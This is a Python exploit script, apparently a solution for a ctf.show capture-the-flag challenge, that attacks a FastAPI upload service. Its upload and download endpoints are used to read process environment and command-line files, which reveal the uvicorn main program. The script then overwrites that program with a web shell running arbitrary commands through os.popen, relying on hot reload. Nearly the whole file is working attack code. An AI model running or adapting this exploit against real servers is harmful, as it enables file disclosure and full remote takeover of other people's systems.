#-*- coding : utf-8 -*-
import time
import requests
import io,json

url = "http://1574d09e-a29c-4553-a4e0-56f8b8b97f72.challenge.ctf.show/"
app = ''

def get_api():
    response = requests.get(url=url+"openapi.json")
    if "FastAPI" in response.text:
        apijson = json.loads(response.text)
    return apijson

def get_pwd():
    pwd = ''
    for pid in range(20):
        data = f'/proc/{pid}/environ'
        file = upload(data)
        content = download(file['fileName'])
        if content['fileName'] and 'PWD' in content['fileContent']:
            pwd = content['fileContent'][content['fileContent'].find("PWD=")+4:content['fileContent'].find("GPG_KEY=")]+'/'
            break
    return pwd

def get_python_file():
    python_file = ''
    for pid in range(20):
        data = f'/proc/{pid}/cmdline'
        file = upload(data)
        content = download(file['fileName'])
        if content['fileName'] and 'uvicorn' in content['fileContent']:
            if 'reload' in content['fileContent']:
                print("✔ 检测到存在reload参数，可以进行热部署")
                python_file = content['fileContent'][content['fileContent'].find("uvicorn")+7:content['fileContent'].find(":")]+".py"
                print(f"✔ 检测到主程序，{python_file}")
                global app
                app = content['fileContent'][content['fileContent'].find("uvicorn")+7+len(python_file)-3+1:content['fileContent'].find("--")]
                print(f"✔ 检测到uvicorn的应用名，{app}")
            else:
                print("❌ 检测到无reload参数，无法热部署，程序结束")
                exit()
            break
    return python_file

def new_file():
    global app
    return f'''
import uvicorn,os
from fastapi import *
{app} = FastAPI()

@{app}.get("/s")
def s(c):
  os.popen(c)
'''.replace("\x00","")

def get_shell(name):
    name = name.replace("\x00","")
    response = requests.post(
            url=url+"upload/",
            files={"file":(name, new_file())}
        )
    if 'fileName' in response.text:
        print(f"✔ 上传成功，等待5秒重载主程序 ")
        for i in range(5):
            time.sleep(1)
            print("✔ "+str(5-i)+" 秒后验证重载")
    else:
        print("❌ 主程序重写失败，程序退出")
        exit()
    try:
        response = requests.get(url=url+'s/?c=whoami', timeout=3)
    except:
        print("❌ 主程序重载失败，程序退出")
        exit()
    if response.status_code == 200:
        print(f"✔ 恭喜，getshell成功 路径为{url}s/ ")
    else:
        print("❌ 主程序重载失败，程序退出")
        exit()

def upload(name):
    f = io.BytesIO(b'a' * 100)
    response = requests.post(
            url=url+"upload/",
            files={"file":(name, f)}
        )
    if 'fileName' in response.text:
        data = json.loads(response.text)
        return data
    else:
        return {'fileName':''}

def download(file):
    response = requests.get(url=url+"uploads/"+file)
    if 'fileName' in response.text:
        data = json.loads(response.text)
        return data
    else:
        return {'fileName':''}

def main():
    print("✔ 开始读取openapi.json")
    apijson = get_api()
    print("✔ 开放api有")
    print(*apijson['paths'])
    print("✔ 开始读取运行目录")
    pwd = get_pwd()
    if pwd:
        print(f"✔ 运行目录读取成功 路径为{pwd}")
    else:
        print("❌ 运行路径读取失败，程序退出")
        exit()
    python_file = get_python_file()
    if python_file:
        print(f"✔ uvicorn主文件读取成功 路径为{pwd}{python_file}")
    else:
        print("❌ uvicorn主文件读取失败，程序退出")
        exit()
    get_shell(pwd+python_file)

if __name__ == "__main__":
    main()